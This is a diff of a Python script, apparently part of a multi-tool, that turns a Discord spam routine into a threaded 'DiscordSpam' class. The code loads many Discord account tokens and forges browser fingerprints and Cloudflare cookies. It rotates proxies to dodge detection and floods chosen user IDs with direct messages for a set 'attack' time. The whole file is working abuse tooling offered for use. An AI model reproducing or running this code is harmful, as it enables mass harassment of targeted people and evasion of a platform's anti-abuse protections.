@@ -13,105 +13,219 @@
 ║                                                                                 ║
 ╚═════════════════════════════════════════════════════════════════════════════════╝
 """
-import requests
-import base64
-import httpagentparser
-import random
+import os
 import time
-from threading import Thread
+import fade
+import ctypes
+import random
+import asyncio
+import aiohttp
+import socket
+import base64
+import urllib3
+from datetime import datetime
+from sys import platform
+import httpagentparser
+from threading import Thread, Lock
+import cloudscraper
 from fake_useragent import UserAgent
 from ua_parser import user_agent_parser
+from colorama import Fore, Style, Back, init
+from core.etc.functions import logo_discord, get_lang, get_proxies, randstr, get_discord_tokens
+
+urllib3.disable_warnings()
+init()
 
 
-def randstr(lenn):
-    lib = string.ascii_lowercase + string.digits
-    text = ''.join(random.choices(lib, k=lenn))
-    return text
+class DiscordSpam:
+    def __init__(self):
+        self.r = '0'
+        self.r2 = '0'
+        self.todo = 0
+        self.started = 0
+        self.lock = Lock()
+        self.lang = get_lang()
+        self.proxies = get_proxies()
+        self.tokens = get_discord_tokens()
+        self.ua = UserAgent(verify_ssl=False)
 
+    def stat(self):
+        if platform == 'win32':
+            ctypes.windll.kernel32.SetConsoleTitleW(f"💣 ・ Successs: {self.r}")
 
-def start_discord(threads, time_a, message, idd, proxy):
-    attack_func = discord_attack1 if proxy == "no" else discord_attack2
+        if self.started == self.todo:
+            with self.lock:
+                if self.lang == 'ru':
+                    print(Fore.WHITE + '[' + Fore.YELLOW + Style.BRIGHT + 'СТАТУС' + Fore.WHITE + '] ' +
+                          Fore.GREEN + 'ОТПРАВЛЕНО: ' + Fore.MAGENTA + self.r + Fore.RED + ' ОШИБКИ: ' + self.r2)
+                else:
+                    print(Fore.WHITE + '[' + Fore.YELLOW + Style.BRIGHT + 'STATUS' + Fore.WHITE + '] ' +
+                          Fore.GREEN + 'SENT: ' + Fore.MAGENTA + self.r + Fore.RED + ' FAILS: ' + self.r2)
 
-    for _ in range(threads):
-        th = Thread(target=attack_func, args=(idd, time_a, message))
-        th.start()
+    def discord_thread(self, targets, message, use_proxy, proxy):
+        scraper = cloudscraper.create_scraper()
+        for target in targets:
+            for token in self.tokens:
+                user = self.ua.random
+                parsed_string = user_agent_parser.Parse(user)
+                parsed_string2 = httpagentparser.detect(user)
+                try:
+                    osv = str(parsed_string["user_agent"]["major"])
+                    bv = str(parsed_string2["browser"]["version"])
+                    string = '{{"os":"Windows","browser":"Chrome","device":"","system_locale":"en-US","browser_user_agent":"{}","browser_version":"{}","os_version":"{}","referrer":"https://www.google.com/","referring_domain":"www.google.com","search_engine":"google","referrer_current":"https://www.google.com/","referring_domain_current":"www.google.com","search_engine_current":"google","release_channel":"stable","client_build_number":169464,"client_event_source":null}}'.format(
+                        user, bv, osv)
+                    cookie = f"__dcfduid={randstr(32)}; __sdcfduid={randstr(96)}; locale=ru; __cf_bm={randstr(189)}"
+                    st = ''
 
+                    if use_proxy == "y" and proxy == {}:
+                        prox = random.choice(self.proxies)
+                        proxy_2 = {"http://" + prox, "https://" + prox}
+                    elif proxy != "":
+                        proxy_2 = proxy
+                    else:
+                        proxy_2 = {}
 
-def discord_attack1(idd, time_a, mes):
-    accounts = []
-    ua = UserAgent()
-    session = requests.Session()
+                    header = {
+                        'authorization': token
+                    }
 
-    with open('input/discord_accounts.txt', 'r') as file:
-        for line in file:
-            accounts.append(line.replace('\n', ''))
+                    payload = {
+                        "recipient_id": target
+                    }
 
-    user = ua.random
-    parsed_string = user_agent_parser.Parse(user)
-    parsed_string2 = httpagentparser.detect(user)
-    osv = str(parsed_string["user_agent"]["major"])
-    bv = str(parsed_string2["browser"]["version"])
+                    r = scraper.post('https://discord.com/api/v9/users/@me/channels', json=payload, headers=header,
+                                     proxies=proxy_2)
 
-    string = '{{"os":"Windows","browser":"Chrome","device":"","system_locale":"en-US","browser_user_agent":"{}","browser_version":"{}","os_version":"{}","referrer":"https://www.google.com/","referring_domain":"www.google.com","search_engine":"google","referrer_current":"https://www.google.com/","referring_domain_current":"www.google.com","search_engine_current":"google","release_channel":"stable","client_build_number":169464,"client_event_source":null}}'.format(user, bv, osv)
-    cookie = f"__dcfduid={randstr(32)}; __sdcfduid={randstr(96)}; locale=ru; __cf_bm={randstr(189)}"
+                    ch_id = r.json()['id']
 
-    header = {
-        'accept': '*/*',
-        'accept-encoding': 'gzip, deflate, br',
-        'accept-language': 'en-US,en;q=0.9,ru;q=0.8',
-        'content-type': 'application/json',
-        'cookie': cookie,
-        'dnt': '1',
-        'origin': 'https://discord.com',
-        'referer': f'https://discord.com/channels/@me/{idd}',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-origin',
-        'user-agent': user,
-        'x-debug-options': 'bugReporterEnabled',
-        'x-discord-locale': 'en-US',
-        'x-super-properties': str(base64.b64encode(string.encode('ascii'))).replace("b'", '').replace("'", '')
-    }
+                    header = {
+                        'accept': '*/*',
+                        'accept-encoding': 'gzip, deflate, br',
+                        'accept-language': 'en-US,en;q=0.9',
+                        'authorization': token,
+                        'content-length': str(len("""{content:""}""") + len(message)),
+                        'content-type': 'application/json',
+                        'cookie': cookie,
+                        'dnt': '1',
+                        'origin': 'https://discord.com',
+                        'referer': f'https://discord.com/channels/@me/{ch_id}',
+                        'sec-fetch-dest': 'empty',
+                        'sec-fetch-mode': 'cors',
+                        'sec-fetch-site': 'same-origin',
+                        'user-agent': user,
+                        'x-debug-options': 'bugReporterEnabled',
+                        'x-discord-locale': 'ru',
+                        'x-super-properties': str(base64.b64encode(string.encode('ascii'))).replace("b'", '').replace("'", '')
+                    }
 
-    payload = {"content": mes, "tts": False}
+                    payload = {
+                        "content": message
+                    }
 
-    while time.monotonic() - t < time_a:
-        for acc in accounts:
-            try:
-                header['authorization'] = acc
-                header['content-length'] = str(26 + len(mes))
+                    r = scraper.post(f'https://discord.com/api/v8/channels/{ch_id}/messages', headers=header,
+                                     json=payload, proxies=proxy_2)
 
-                session.post(f'https://discord.com/api/v9/channels/{idd}/messages', json=payload, headers=header)
+                    self.r = str(int(self.r) + 1)
+                    self.stat()
+                except:
+                    self.r2 = str(int(self.r2) + 1)
+                    self.stat()
 
-            except Exception as e:
-                print(e)
+    def run_thread(self, time_a, target, message, use_proxy, proxy=""):
+        t = time.monotonic()
+        if use_proxy != 'y':
+            proxy = {}
+        while time.monotonic() - t < time_a:
+            self.discord_thread(target, message, use_proxy, proxy)
 
+    def start_discord(self):
+        if platform == 'win32':
+            os.system("cls")
+        else:
+            os.system("clear")
 
-def discord_attack2(a, b, c):
-    import requests as r, base64 as b, httpagentparser as h, random as R, time as t
-    from fake_useragent import UserAgent as U
-    from ua_parser import user_agent_parser as p
-    o, a, b, c = [[] for i in [0] * 4], list(open(a[0]).readlines()), list(open(a[1]).readlines()), t.monotonic()
-    while t.monotonic() - c < b:
-        for x in b:
-            try:
-                u = p.Parse(U().random);y = h.detect(U().random)
-                q = str(u["user_agent"]["major"]);w = str(y["browser"]["version"])
-                p = {"http": "http://" + R.choice(a), "https": "https://" + R.choice(a)}
-                n = '{ "os":"Windows","browser":"Chrome","device":"","system_locale":"en-US","browser_user_agent":"' + U().random + '","browser_version":"' + w + '","os_version":"' + q + '","referrer":"https://www.google.com/","referring_domain":"www.google.com","search_engine":"google","referrer_current":"https://www.google.com/","referring_domain_current":"www.google.com","search_engine_current":"google","release_channel":"stable","client_build_number":169464,"client_event_source":null}'
-                e = "__dcfduid=" + b.b64encode(R.urandom(32)).decode() + "; __sdcfduid=" + b.b64encode(
-                    R.urandom(96)).decode() + "; locale=ru; __cf_bm=" + b.b64encode(R.urandom(189)).decode()
-                f = {"content": c, "tts": False}
-                h = {"accept": "*/*", "accept-encoding": "gzip, deflate, br",
-                     "accept-language": "en-US,en;q=0.9,ru;q=0.8", "authorization": x,
-                     "content-length": str(26 + len(c)), "content-type": "application/json", "cookie": e,
-                     "dnt": "1", "origin": "https://discord.com",
-                     "referer": "https://discord.com/channels/@me/" + b, "sec-fetch-dest": "empty",
-                     "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin", "user-agent": U().random,
-                     "x-debug-options": "bugReporterEnabled", "x-discord-locale": "en-US",
-                     "x-super-properties": b.b64encode(n.encode()).decode().replace("=", "").replace("+",
-                                                                                                     "-").replace(
-                         "/", "_")}
-                r.post("https://discord.com/api/v9/channels/" + b + "/messages", json=f, headers=h, proxies=p)
-            except:
-                pass
+        logo_discord()
+
+        if self.lang == 'ru':
+            text = "\nID пользователя(ей) discord для атаки > "
+            text2 = """
+╔═════════════════════════════════════════╗
+║Если вы собираетесь указать несоклько ID,║
+║  то делайте это в следующем вормате:    ║
+║             ID, ID, ID                  ║
+║                                         ║
+║    Формат ID: 9999999999999999999       ║
+╚═════════════════════════════════════════╝
+                    """
+            text3 = "Сообщение для отправки > "
+        else:
+            text = "\nDiscord user(s) ID for the attack > "
+            text2 = """
+╔═══════════════════════════════════════════╗
+║If you are going to enter more than one ID,║
+║      do it in the following format:       ║
+║              ID, ID, ID                   ║
+║                                           ║
+║     ID format: 9999999999999999999        ║
+╚═══════════════════════════════════════════╝    
+                    """
+            text3 = "Message to send > "
+
+        print(fade.water(text2))
+
+        ids = input(Fore.YELLOW + Style.BRIGHT + text + Fore.GREEN)
+        ids = ids.replace(' ', '')
+        ids = ids.split(',')
+        mes = input(Fore.YELLOW + Style.BRIGHT + text3 + Fore.GREEN)
+
+        if self.lang == 'ru':
+            text = 'Использовать прокси? (y/n) > '
+            text2 = 'Потоки > '
+            text3 = 'Время атаки (в сек.) > '
+            text4 = '\n!НЕ РЕКОМАНДУЕТСЯ!'
+            text5 = '\nЗапустить потоки для каждой прокси? (y/n) > '
+            text6 = 'поток запущен'
+        else:
+            text = 'Use proxies? (y/n) > '
+            text2 = 'Threads > '
+            text3 = 'Time attack (in sec.) > '
+            text4 = '\n!NOT RECOMMENDED!'
+            text5 = '\nStart threads for every proxy? (y/n) > '
+            text6 = 'thread started'
+
+        if not self.proxies:
+            use_proxy = 'n'
+        else:
+            use_proxy = input(Fore.YELLOW + Style.BRIGHT + text + Fore.GREEN).lower()
+
+        self.todo = int(input(Fore.YELLOW + Style.BRIGHT + text2 + Fore.GREEN))
+        time_attack = int(input(Fore.YELLOW + Style.BRIGHT + text3 + Fore.GREEN))
+
+        if use_proxy == 'y':
+            print(Back.RED + Fore.WHITE + text4 + Fore.RESET + Style.RESET_ALL)
+            proxy_threads = input(Fore.YELLOW + Style.BRIGHT + text5 + Fore.GREEN).lower()
+        else:
+            proxy_threads = 'n'
+
+        th = None
+
+        if proxy_threads == 'y':
+            for proxy in self.proxies:
+                for count in range(self.todo):
+                    th = Thread(target=self.run_thread, args=(time_attack, ids, mes, use_proxy, proxy,))
+                    th.start()
+                    self.started += 1
+                    print(Fore.WHITE + '[' + Fore.MAGENTA + str(self.started) + Fore.WHITE + '] ' +
+                          Fore.YELLOW + Style.BRIGHT + text6)
+
+        else:
+            for count in range(self.todo):
+                th = Thread(target=self.run_thread, args=(time_attack, ids, mes, use_proxy,))
+                th.start()
+                self.started += 1
+                print(Fore.WHITE + '[' + Fore.MAGENTA + str(self.started) + Fore.WHITE + '] ' +
+                      Fore.YELLOW + Style.BRIGHT + text6)
+
+        time.sleep(1)
+
+        th.join()
